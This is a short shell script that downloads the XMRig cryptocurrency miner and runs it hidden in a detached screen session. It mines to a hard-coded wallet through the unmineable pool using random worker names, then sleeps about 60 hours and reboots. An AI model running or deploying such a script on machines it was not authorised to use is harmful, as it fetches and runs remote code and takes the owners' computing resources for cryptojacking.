#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar -xf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
screen -S "ftm" -d -m ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TMbnoB7xrvjmLFUzVvBNqT42m2r6qJQSB2.Godliker-$(echo $(shuf -i 10000-99999 -n 1)) -p x
sleep 216000
sudo reboot
